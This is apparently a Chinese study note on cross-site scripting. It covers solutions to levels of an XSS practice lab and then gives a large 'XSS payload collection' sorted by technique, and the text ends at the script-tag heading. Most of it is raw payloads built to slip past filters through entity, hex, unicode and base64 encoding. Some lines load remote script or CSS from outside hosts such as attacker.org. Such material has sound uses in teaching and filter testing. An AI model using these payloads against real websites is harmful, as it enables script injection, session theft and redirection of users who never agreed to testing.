![截屏2021-06-15 下午11.38.06.png](https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623771524348-f8bbb88a-a43f-4ceb-b210-120c53e0c5ed.png#align=left&amp;display=inline&amp;height=1666&amp;margin=%5Bobject%20Object%5D&amp;name=%E6%88%AA%E5%B1%8F2021-06-15%20%E4%B8%8B%E5%8D%8811.38.06.png&amp;originHeight=1666&amp;originWidth=2536&amp;size=901092&amp;status=done&amp;style=none&amp;width=2536)&lt;br &#x2F;&gt;同11关一样，burp抓包后更改cookie&lt;br &#x2F;&gt;payload&lt;br &#x2F;&gt;**Referer: &quot; onmouseover=alert(1) type=&quot;text&quot;**&lt;br &#x2F;&gt;**Referer: &quot; onclick=alert(1) type=&quot;text&quot;**
## Exif xss
Exif即&lt;br &#x2F;&gt;**可交换图像文件格式**（英语：Exchangeable image file format，官方简称**Exif**），是专门为[数码相机](https:&#x2F;&#x2F;zh.wikipedia.org&#x2F;wiki&#x2F;%E6%95%B0%E7%A0%81%E7%9B%B8%E6%9C%BA)的照片设定的，可以记录数码照片的属性信息和拍摄数据。可使用鼠标右键进入属性页面查看部分信息。&lt;br &#x2F;&gt;![image.png](https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623852389251-63b29dd3-983c-4b96-aa7f-7253d6f2fd41.png#align=left&amp;display=inline&amp;height=608&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=608&amp;originWidth=413&amp;size=27572&amp;status=done&amp;style=none&amp;width=413)
&lt;p&gt;使用工具（如exiftool）可以修改图片的信息数据&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623852519991-d32f775a-804d-43d4-a162-acaae9818014.png#align=left&amp;amp;display=inline&amp;amp;height=574&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=574&amp;amp;originWidth=419&amp;amp;size=33790&amp;amp;status=done&amp;amp;style=none&amp;amp;width=419&quot; alt=&quot;image.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;然后上传到可以读取Exif的网站上即可出现弹窗&lt;br &#x2F;&gt;有些谷歌浏览器安装了EXIF Vewer插件，而chrome Exif Viewer插件获取图片exif信息的时候没有过滤，导致了XSS代码的执行。&lt;&#x2F;p&gt;
&lt;h2 id=&quot;angular-jszhong-de-ng-include&quot;&gt;angular js中的ng-include&lt;&#x2F;h2&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623849212857-3d1b95b5-375a-4433-9fb9-7d39854461f0.png#align=left&amp;amp;display=inline&amp;amp;height=1662&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-16%20%E4%B8%8B%E5%8D%889.13.15.png&amp;amp;originHeight=1662&amp;amp;originWidth=2604&amp;amp;size=1010834&amp;amp;status=done&amp;amp;style=none&amp;amp;width=2604&quot; alt=&quot;截屏2021-06-16 下午9.13.15.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;观察网页源码，发现“ng-include”字样&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623849597831-0f074ce1-af05-4147-adca-4547b588c0ee.png#align=left&amp;amp;display=inline&amp;amp;height=1354&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-16%20%E4%B8%8B%E5%8D%889.19.43.png&amp;amp;originHeight=1354&amp;amp;originWidth=1696&amp;amp;size=238306&amp;amp;status=done&amp;amp;style=none&amp;amp;width=1696&quot; alt=&quot;截屏2021-06-16 下午9.19.43.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;在第15关的URL后加上&lt;br &#x2F;&gt;&lt;strong&gt;?src=&#x27;level1.php?name=&lt;img src=1 onerror=alert()&gt;&#x27;&lt;&#x2F;strong&gt;&lt;br &#x2F;&gt;或者&lt;br &#x2F;&gt;&lt;strong&gt;?src=&#x27;level2.php?keyword=&amp;quot; οnclick=&amp;quot;alert(1)&#x27;&lt;&#x2F;strong&gt;&lt;br &#x2F;&gt;后台源码&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623850344951-b01773bd-744e-4e08-9725-d28e1df40f96.png#align=left&amp;amp;display=inline&amp;amp;height=212&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-16%20%E4%B8%8B%E5%8D%889.32.08.png&amp;amp;originHeight=212&amp;amp;originWidth=1478&amp;amp;size=39774&amp;amp;status=done&amp;amp;style=none&amp;amp;width=1478&quot; alt=&quot;截屏2021-06-16 下午9.32.08.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;h2 id=&quot;kong-ge-bian-hui-che-rao-guo&quot;&gt;空格变回车绕过&lt;&#x2F;h2&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623850972595-4a0320ea-4ec0-4c72-befa-6f513ca8609a.png#align=left&amp;amp;display=inline&amp;amp;height=1662&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-16%20%E4%B8%8B%E5%8D%889.40.16.png&amp;amp;originHeight=1662&amp;amp;originWidth=2604&amp;amp;size=1048294&amp;amp;status=done&amp;amp;style=none&amp;amp;width=2604&quot; alt=&quot;截屏2021-06-16 下午9.40.16.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;禁止大小写绕过&lt;br &#x2F;&gt;script , &#x2F; , (空格),等都被转换成&amp;amp;nbsp&lt;br &#x2F;&gt;即用%0d，%0a等绕过：&lt;br &#x2F;&gt;0a------换行符号－－－－－－&amp;quot;\n&amp;quot;&lt;br &#x2F;&gt;0d------回车符号－－－－－－&amp;quot;\r&amp;quot;&lt;br &#x2F;&gt;payload&lt;br &#x2F;&gt;&lt;strong&gt;&amp;lt;img%0asrc=1%0aonerror=alert(1)&amp;gt;&lt;&#x2F;strong&gt;&lt;br &#x2F;&gt;&lt;strong&gt;&amp;lt;iframe%0asrc=x%0donmouseover=alert&lt;code&gt;1&lt;&#x2F;code&gt;&amp;gt;&lt;&#x2F;iframe&gt;&lt;&#x2F;strong&gt;&lt;br &#x2F;&gt;&lt;strong&gt;&amp;lt;svg%0aonload=alert&lt;code&gt;1&lt;&#x2F;code&gt;&amp;gt;&lt;&#x2F;svg&gt;&lt;&#x2F;strong&gt;&lt;br &#x2F;&gt;后台源码&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623851182421-a61df0f2-f17e-4915-ad62-33eca5c8b36a.png#align=left&amp;amp;display=inline&amp;amp;height=1256&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-16%20%E4%B8%8B%E5%8D%889.46.03.png&amp;amp;originHeight=1256&amp;amp;originWidth=1222&amp;amp;size=269348&amp;amp;status=done&amp;amp;style=none&amp;amp;width=1222&quot; alt=&quot;截屏2021-06-16 下午9.46.03.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;所以要利用html编码的空白字符&lt;code&gt;%0a&lt;&#x2F;code&gt;代替空格&lt;&#x2F;p&gt;
&lt;h2 id=&quot;ke-kong-bian-liang-rao-guo&quot;&gt;可控变量绕过&lt;&#x2F;h2&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1623851781792-8308dae8-72ae-406e-b840-d6ae1858339b.png#align=left&amp;amp;display=inline&amp;amp;height=1662&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-16%20%E4%B8%8B%E5%8D%889.54.27.png&amp;amp;originHeight=1662&amp;amp;originWidth=2604&amp;amp;size=537230&amp;amp;status=done&amp;amp;style=none&amp;amp;width=2604&quot; alt=&quot;截屏2021-06-16 下午9.54.27.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;观察网页源码，发现&lt;br &#x2F;&gt;&amp;lt;embed src=xsf01.swf?a=b width=100% heigth=100%&amp;gt;&lt;h2 align=center&gt;成功后，&amp;lt;a href=level18.php?arg01=a&amp;amp;arg02=b&amp;gt;点我进入下一关&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;&lt;br &#x2F;&gt;传入的参数在下方输出到页面上&lt;br &#x2F;&gt;网页后台又对参数进行了实体编码转换，这里构造事件进行弹框&lt;br &#x2F;&gt;payload&lt;br &#x2F;&gt;&lt;strong&gt;level17.php?arg01=a&amp;amp;arg02=1%20οnmοuseοver=alert(1)&lt;&#x2F;strong&gt;&lt;br &#x2F;&gt;第18关与本关相同&lt;&#x2F;p&gt;
&lt;h1 id=&quot;xss-payloadda-quan&quot;&gt;XSS payload大全&lt;&#x2F;h1&gt;
&lt;h2 id=&quot;di-yi-lei-javascript-url&quot;&gt;第一类：Javascript URL&lt;&#x2F;h2&gt;
&lt;p&gt;&lt;a href=&quot;javascript:alert(&#x27;test&#x27;)&quot;&gt;link&lt;&#x2F;a&gt;&lt;br &#x2F;&gt;&lt;a href=&quot;java&amp;#115;cript:alert(&#x27;xss&#x27;)&quot;&gt;link&lt;&#x2F;a&gt;&lt;br &#x2F;&gt;&lt;a href=&#x27;vbscript:MsgBox(&quot;XSS&quot;)&#x27;&gt;link&lt;&#x2F;a&gt;&lt;br &#x2F;&gt;&lt;a href=&quot;vbscript:alert(1)&quot;&gt;Hello&lt;&#x2F;a&gt;&lt;br &#x2F;&gt;&lt;a href=&quot;vbscript&amp;#058;alert(1)&quot;&gt;Hello&lt;&#x2F;a&gt;&lt;br &#x2F;&gt;&lt;a href=javascript:alert(&amp;quot;XSS&amp;quot;)&gt;link&lt;&#x2F;a&gt;&lt;br &#x2F;&gt;&amp;lt;a href=&lt;code&gt;javascript:alert(&amp;quot;RSnake says,&#x27;XSS&#x27;&amp;quot;)&lt;&#x2F;code&gt;&amp;gt;link&lt;&#x2F;a&gt;&lt;br &#x2F;&gt;&lt;a href=javascript:alert(String.fromCharCode(88,83,83))&gt;link&lt;&#x2F;a&gt;&lt;br &#x2F;&gt;&lt;a href=&quot;javascript&amp;colon;alert(1)&quot;&gt;link&lt;&#x2F;a&gt;&lt;br &#x2F;&gt;&lt;a href=&quot;javaSCRIPT&amp;colon;alert(1)&quot;&gt;Hello&lt;&#x2F;a&gt;&lt;br &#x2F;&gt;&lt;a href=&quot;javasc&amp;NewLine;ript&amp;colon;alert(1)&quot;&gt;link&lt;&#x2F;a&gt; &lt;br &#x2F;&gt;&lt;a href=&quot;javas&amp;Tab;cript:\u0061lert(1);&quot;&gt;Hello&lt;&#x2F;a&gt;&lt;br &#x2F;&gt;&lt;a href=&quot;jav    ascript:alert(&#x27;XSS&#x27;)&quot;&gt;link&lt;&#x2F;a&gt;&lt;br &#x2F;&gt;&lt;a href=&quot;jav&amp;#x09;ascript:alert(&#x27;XSS&#x27;)&quot;&gt;link&lt;&#x2F;a&gt;&lt;br &#x2F;&gt;&lt;a href=&quot;jav&amp;#x0D;ascript:alert(&#x27;XSS&#x27;)&quot;&gt;link&lt;&#x2F;a&gt;&lt;br &#x2F;&gt;&lt;a href=&quot; &amp;#14;  javascript:alert(&#x27;XSS&#x27;);&quot;&gt;link&lt;&#x2F;a&gt;&lt;br &#x2F;&gt;&lt;a href=&quot;javascript:\u0061lert&amp;#x28;1&amp;#x29&quot;&gt;Hello&lt;&#x2F;a&gt;&lt;br &#x2F;&gt;&lt;a href=&quot;javascript:confirm`1`&quot;&gt;link&lt;&#x2F;a&gt;&lt;br &#x2F;&gt;&lt;a href=&quot;javascript:confirm(1)&quot;&gt;link&lt;&#x2F;a&gt;&lt;br &#x2F;&gt;&lt;a href=&quot;j&amp;Tab;a&amp;Tab;vas&amp;Tab;c&amp;Tab;r&amp;Tab;ipt:alert(1)&quot;&gt;1&lt;&#x2F;a&gt;&lt;br &#x2F;&gt;&lt;a href=&quot;javascript:%61%6c%65%72%74%28%31%29&quot;&gt;link&lt;&#x2F;a&gt;&lt;br &#x2F;&gt;&lt;a href=&quot;javascript:\u0061\u006C\u0065\u0072\u0074(1)&quot;&gt;link&lt;&#x2F;a&gt;&lt;br &#x2F;&gt;&amp;lt;a href=javascript:eval(&amp;quot;\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29&amp;quot;)&amp;gt;2&lt;&#x2F;a&gt;&lt;br &#x2F;&gt;&amp;lt;a href=javascript:eval(&amp;quot;alert(&#x27;xss&#x27;)&amp;quot;)&amp;gt;link&lt;&#x2F;a&gt;  &lt;br &#x2F;&gt;&lt;a href=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;&gt;link&lt;&#x2F;a&gt;&lt;br &#x2F;&gt;&lt;a href=&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041&gt;link&lt;&#x2F;a&gt;&lt;br &#x2F;&gt;&lt;a href=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;link&lt;&#x2F;a&gt;&lt;br &#x2F;&gt;&lt;a href=&quot;data:text&#x2F;html;base64,amF2YXNjcmlwdDphbGVydCgxKQ==&quot;&gt;test&lt;&#x2F;a&gt; &lt;br &#x2F;&gt;&lt;a href=data:text&#x2F;html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+&gt;1&lt;&#x2F;a&gt;&lt;br &#x2F;&gt;&amp;lt;iframe&#x2F;src=&amp;quot;data:text&#x2F;html;	base64
,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==&amp;quot;&amp;gt;&lt;&#x2F;p&gt;
&lt;h2 id=&quot;di-er-lei-css-import&quot;&gt;第二类：CSS import&lt;&#x2F;h2&gt;
&lt;style&gt;@import url(&quot;http:&#x2F;&#x2F;attacker.org&#x2F;malicious.css&quot;);&lt;&#x2F;style&gt;&lt;br &#x2F;&gt;&lt;style&gt;@imp\ort url(&quot;http:&#x2F;&#x2F;attacker.org&#x2F;malicious.css&quot;);&lt;&#x2F;style&gt;&lt;br &#x2F;&gt;&lt;STYLE&gt;@im\port&#x27;\ja\vasc\ript:alert(&quot;XSS&quot;)&#x27;;&lt;&#x2F;STYLE&gt;&lt;br &#x2F;&gt;&lt;STYLE&gt;@import&#x27;http:&#x2F;&#x2F;jb51.net&#x2F;xss.css&#x27;;&lt;&#x2F;STYLE&gt;
&lt;h2 id=&quot;di-san-lei-inline-style&quot;&gt;第三类：Inline style&lt;&#x2F;h2&gt;
&lt;div style=&quot;color: expression(alert(&#x27;XSS&#x27;))&quot;&gt;&lt;br &#x2F;&gt;&lt;div style=color:expression\(alert(1))&gt;&lt;&#x2F;div&gt; &lt;br &#x2F;&gt;&lt;div style=&quot;color: &#x27;&lt;&#x27;; color: expression(alert(&#x27;XSS&#x27;))&quot;&gt;&lt;br &#x2F;&gt;&lt;div style=X:expression(alert(&#x2F;xss&#x2F;))&gt;&lt;br &#x2F;&gt;&lt;div style=&quot;x:\65\78\70\72\65\73\73\69\6f\6e(alert(1))&quot;&gt;&lt;br &#x2F;&gt;&lt;div style=&quot;x:\000065\000078\000070\000072\000065\000073\000073\000069\00006f\00006e(alert(1))&quot;&gt;&lt;br &#x2F;&gt;&lt;div style=&quot;x:\65\78\70\72\65\73\73\69\6f\6e\028 alert \028 1 \029 \029&quot;&gt;&lt;br &#x2F;&gt;&lt;STYLE&gt;li {list-style-image: url(&quot;javascript:alert(&#x27;XSS&#x27;)&quot;);}&lt;&#x2F;STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS&lt;br &#x2F;&gt;&lt;DIV STYLE=&quot;background-image: url(javascript:alert(&#x27;XSS&#x27;))&quot;&gt;&lt;br &#x2F;&gt;&lt;STYLE&gt;.XSS{background-image:url(&quot;javascript:alert(&#x27;XSS&#x27;)&quot;);}&lt;&#x2F;STYLE&gt;&lt;A CLASS=XSS&gt;&lt;&#x2F;A&gt;&lt;br &#x2F;&gt;&lt;div style=&quot;z:exp&#x2F;*anything*&#x2F;res&#x2F;*here*&#x2F;sion(alert(1))&quot;&gt;&lt;br &#x2F;&gt;&lt;div style=xss:expr&#x2F;*XSS*&#x2F;ession(alert(&#x27;XSS&#x27;))&gt;&lt;br &#x2F;&gt;&lt;&#x2F;XSS&#x2F;*-*&#x2F;STYLE=xss:e&#x2F;**&#x2F;xpression(alert(&#x27;XSS&#x27;))&gt;&lt;br &#x2F;&gt;&lt;&#x2F;XSS&#x2F;*-*&#x2F;STYLE=xss:e&#x2F;**&#x2F;xpression(window.location=&quot;http:&#x2F;&#x2F;www.baidu.com&quot;)&gt; &lt;br &#x2F;&gt;&lt;img STYLE=&quot;background-image:url(javascript:alert(&#x27;XSS&#x27;))&quot;&gt; &#x2F;&#x2F;ie6  &lt;br &#x2F;&gt;&lt;img STYLE=&quot;background-image:\75\72\6c\28\6a\61\76\61\73\63\72\69\70\74\3a\61\6c\65\72\74\28\27\58\53\53\27\29\29&quot;&gt; &lt;br &#x2F;&gt;&lt;A STYLE=&#x27;no\xss:noxss(&quot;*&#x2F;&#x2F;*&quot;);xss:&amp;#101;x&amp;#x2F;*XSS*&#x2F;&#x2F;*&#x2F;*&#x2F;pression(alert(&quot;XSS&quot;))&#x27;&gt;
## 第四类：JavaScript 事件
&lt;div onclick=&quot;alert(&#x27;xss&#x27;)&quot;&gt;&lt;br &#x2F;&gt;&lt;div onmouseenter=&quot;alert(&#x27;xss&#x27;)&quot;&gt;&lt;br &#x2F;&gt;&lt;div onclick =&quot;alert(&#x27;xss&#x27;)&quot;&gt;&lt;br &#x2F;&gt;&lt;BODY ONLOAD=alert(&#x27;XSS&#x27;)&gt;&lt;br &#x2F;&gt;&lt;img src=1 onerror=alert(1)&gt;&lt;br &#x2F;&gt;&lt;img&#x2F;src=&#x27;1&#x27;&#x2F;onerror=alert(0)&gt;&lt;br &#x2F;&gt;&lt;img src=&quot;1&quot; onerror=&quot;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&quot; &#x2F;&gt;&lt;br &#x2F;&gt;&lt;img src=1 alt=al lang=ert onerror=top[alt+lang](0)&gt;&lt;br &#x2F;&gt;&lt;img src=&quot;1&quot; onerror=eval(&quot;\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29&quot;)&gt;&lt;&#x2F;img&gt;&lt;br &#x2F;&gt;&lt;img src=1 onmouseover=alert(&#x27;xss&#x27;) a1=1111&gt; &lt;br &#x2F;&gt;&lt;img src=x onerror=s=createElement(&#x27;script&#x27;);body.appendChild(s);s.src=&#x27;http:&#x2F;&#x2F;t.cn&#x2F;R5UpyOt&#x27;;&gt;&lt;br &#x2F;&gt;&lt;a href=&quot;#&quot; onclick=alert(&#x27;\170\163\163&#x27;)&gt;test&lt;&#x2F;a&gt;&lt;br &#x2F;&gt;&lt;a href=&quot;#&quot; onclick=&quot;\u0061\u006C\u0065\u0072\u0074(1)&quot;&gt;link&lt;&#x2F;a&gt;&lt;br &#x2F;&gt;&lt;a href=&quot;#&quot; onclick=&quot;\u0061\u006C\u0065\u0072\u0074`a`&quot;&gt;link&lt;&#x2F;a&gt;&lt;br &#x2F;&gt;&lt;a href=&quot;#&quot; onclick=&quot;alert(&amp;#039;xss&amp;#039;)&quot;&gt;link&lt;&#x2F;a&gt;&lt;br &#x2F;&gt;&lt;marquee onscroll=alert(1)&gt; test&lt;&#x2F;marquee&gt;&lt;br &#x2F;&gt;&lt;div  style=&quot;width:100px;height:100px;overflow:scroll&quot; onscroll=&quot;alert(&#x27;a&#x27;)&quot;&gt;123456 &lt;br&#x2F;&gt;&lt;br&#x2F;&gt;&lt;br&#x2F;&gt;&lt;br&#x2F;&gt;&lt;br&#x2F;&gt;&lt;&#x2F;div&gt;&lt;br &#x2F;&gt;&lt;DIV onmousewheel=&quot;alert(&#x27;a&#x27;)&quot; &gt;123456&lt;&#x2F;DIV&gt;&lt;br&#x2F;&gt;&lt;br&#x2F;&gt;&lt;br&#x2F;&gt;&lt;br&#x2F;&gt;&lt;br&#x2F;&gt;&lt;br&#x2F;&gt;&lt;br&#x2F;&gt;&lt;br&#x2F;&gt;&lt;br&#x2F;&gt;&lt;br&#x2F;&gt;&lt;br&#x2F;&gt;&lt;br &#x2F;&gt;&lt;div style=&quot;background-color:red&quot; onmouseenter=&quot;alert(&#x27;a&#x27;)&quot;&gt;123456&lt;&#x2F;div&gt;&lt;br &#x2F;&gt;&lt;DIV onmouseleave=&quot;alert(&#x27;1&#x27;)&quot;&gt;123456&lt;&#x2F;DIV&gt;&lt;br &#x2F;&gt;&lt;div contentEditable=&quot;true&quot; style=&quot;background-color:red&quot; onfocusin=&quot;alert(&#x27;a&#x27;)&quot; &gt;asdf&lt;&#x2F;div&gt;&lt;br &#x2F;&gt;&lt;div contentEditable=&quot;true&quot; style=&quot;background-color:red&quot; onfocusout=&quot;alert(&#x27;bem&#x27;)&quot; &gt;asdf&lt;&#x2F;div&gt;&lt;br &#x2F;&gt;&lt;marquee onstart=&quot;alert(&#x27;a&#x27;)&quot; &gt;asdf&lt;&#x2F;marquee&gt;&lt;br &#x2F;&gt;&lt;div style=&quot;background-color:red;&quot; onbeforecopy=&quot;alert(&#x27;a&#x27;)&quot; &gt;asdf&lt;&#x2F;div&gt;&lt;br &#x2F;&gt;&lt;div style=&quot;background-color:red;&quot; onbeforecut=&quot;alert(&#x27;a&#x27;)&quot; &gt;asdf&lt;&#x2F;div&gt;&lt;br &#x2F;&gt;&lt;div style=&quot;background-color:red;&quot; contentEditable=&quot;true&quot; onbeforeeditfocus=&quot;alert(&#x27;a&#x27;)&quot; &gt;asdf&lt;&#x2F;div&gt;&lt;br &#x2F;&gt;&lt;div style=&quot;background-color:red;&quot; =&quot;true&quot; onbeforepaste=&quot;alert(&#x27;a&#x27;)&quot; &gt;asdf&lt;&#x2F;div&gt;&lt;br &#x2F;&gt;&lt;div style=&quot;background-color:red;&quot; oncontextmenu=&quot;alert(&#x27;a&#x27;)&quot; &gt;asdf&lt;&#x2F;div&gt;&lt;br &#x2F;&gt;&lt;div style=&quot;background-color:red;&quot; oncopy=&quot;alert(&#x27;a&#x27;)&quot; &gt;asdf&lt;&#x2F;div&gt;&lt;br &#x2F;&gt;&lt;div contentEditable=&quot;true&quot; style=&quot;background-color:red;&quot; oncut=&quot;alert(&#x27;a&#x27;)&quot; &gt;asdf&lt;&#x2F;div&gt;&lt;br &#x2F;&gt;&lt;div style=&quot;background-color:red;&quot; ondrag=&quot;alert(&#x27;1&#x27;)&quot; &gt;asdf&lt;&#x2F;div&gt;&lt;br &#x2F;&gt;&lt;div style=&quot;background-color:red;&quot; ondragend=&quot;alert(&#x27;a&#x27;)&quot; &gt;asdf&lt;&#x2F;div&gt;&lt;br &#x2F;&gt;&lt;div style=&quot;background-color:red;&quot; ondragenter=&quot;alert(&#x27;b&#x27;)&quot; &gt;asdf&lt;&#x2F;div&gt;&lt;br &#x2F;&gt;&lt;div contentEditable=&quot;true&quot; style=&quot;background-color:red;&quot; ondragleave=&quot;alert(&#x27;a&#x27;)&quot; &gt;asdf&lt;&#x2F;div&gt;&lt;br &#x2F;&gt;&lt;div contentEditable=&quot;true&quot; style=&quot;background-color:red;&quot; ondragover=&quot;alert(&#x27;b&#x27;)&quot; &gt;asdf&lt;&#x2F;div&gt;&lt;br &#x2F;&gt;&lt;div contentEditable=&quot;true&quot; style=&quot;background-color:red;&quot; ondragstart=&quot;alert(&#x27;a&#x27;)&quot; &gt;asdf&lt;&#x2F;div&gt;&lt;br &#x2F;&gt;&lt;div contentEditable=&quot;true&quot; style=&quot;background-color:red;&quot; ondrop=&quot;alert(&#x27;b&#x27;)&quot; &gt;asdf&lt;&#x2F;div&gt; &lt;div contentEditable=&quot;true&quot; style=&quot;background-color:green;&quot; ondrop=&quot;alert(&#x27;bem&#x27;)&quot; &gt;asdf&lt;&#x2F;div&gt;&lt;br &#x2F;&gt;&lt;div contentEditable=&quot;true&quot; style=&quot;background-color:red;&quot; onlosecapture=&quot;alert(&#x27;b&#x27;)&quot;&gt;asdf&lt;&#x2F;div&gt;&lt;br &#x2F;&gt;&lt;div contentEditable=&quot;true&quot; style=&quot;background-color:red;&quot; onpaste=&quot;alert(&#x27;a&#x27;)&quot; &gt;asdf&lt;&#x2F;div&gt;&lt;br &#x2F;&gt;&lt;div contentEditable=&quot;true&quot; style=&quot;background-color:red;&quot; onselectstart=&quot;alert(&#x27;a&#x27;)&quot; &gt;asdf&lt;&#x2F;div&gt;&lt;br &#x2F;&gt;&lt;div contentEditable=&quot;true&quot; style=&quot;background-color:red;&quot; onhelp=&quot;alert(&#x27;a&#x27;)&quot; &gt;asdf&lt;&#x2F;div&gt;&lt;br &#x2F;&gt;&lt;div STYLE=&quot;background-color:red;behavior:url(&#x27;#default#time2&#x27;)&quot; onEnd=&quot;alert(&#x27;a&#x27;)&quot;&gt;asdf&lt;&#x2F;div&gt;&lt;br &#x2F;&gt;&lt;div STYLE=&quot;background-color:red;behavior:url(&#x27;#default#time2&#x27;)&quot; onBegin=&quot;alert(&#x27;a&#x27;)&quot;&gt;asdf&lt;&#x2F;div&gt;&lt;br &#x2F;&gt;&lt;div contentEditable=&quot;true&quot; STYLE=&quot;background-color:red;&quot; onactivate=&quot;alert(&#x27;b&#x27;)&quot;&gt;asdf&lt;&#x2F;div&gt;&lt;br &#x2F;&gt;&lt;div contentEditable=&quot;true&quot; STYLE=&quot;background-color:red;filter: Alpha(opacity=100, style=2);&quot;onfilterchange=&quot;alert(&#x27;b&#x27;)&quot;&gt;asdf&lt;&#x2F;div&gt;&lt;br &#x2F;&gt;&lt;div contentEditable=&quot;true&quot; onbeforeactivate=&quot;alert(&#x27;b&#x27;)&quot;&gt;asdf&lt;&#x2F;div&gt;&lt;br &#x2F;&gt;&lt;div contentEditable=&quot;true&quot; onbeforedeactivate=&quot;alert(&#x27;a&#x27;)&quot;&gt;asdf&lt;&#x2F;div&gt;&lt;br &#x2F;&gt;&lt;div contentEditable=&quot;true&quot; ondeactivate=&quot;alert(&#x27;bem&#x27;)&quot;&gt;asdf&lt;&#x2F;div&gt;&lt;br &#x2F;&gt;&lt;video src=&quot;http:&#x2F;&#x2F;www.w3schools.com&#x2F;html5&#x2F;movie.ogg&quot; onloadedmetadata=&quot;alert(1)&quot; &#x2F;&gt;&lt;br &#x2F;&gt;&lt;video src=&quot;http:&#x2F;&#x2F;www.w3schools.com&#x2F;html5&#x2F;movie.ogg&quot; onloadstart=&quot;alert(1)&quot; &#x2F;&gt;&lt;br &#x2F;&gt;&lt;audio src=&quot;http:&#x2F;&#x2F;www.w3schools.com&#x2F;html5&#x2F;movie.ogg&quot; onloadstart=&quot;alert(1)&quot;&gt;&lt;br &#x2F;&gt;&lt;audio src=&quot;http:&#x2F;&#x2F;www.w3schools.com&#x2F;html5&#x2F;movie.ogg&quot; onloadstart=&quot;alert(1)&quot;&gt;&lt;&#x2F;audio&gt;&lt;br &#x2F;&gt;&lt;body onscroll=alert(26)&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br &#x2F;&gt;&lt;input type=&quot;hidden&quot; accesskey=&quot;X&quot; onclick=&quot;alert(&#x2F;xss&#x2F;)&quot;&gt;
## 第五类：Script 标签
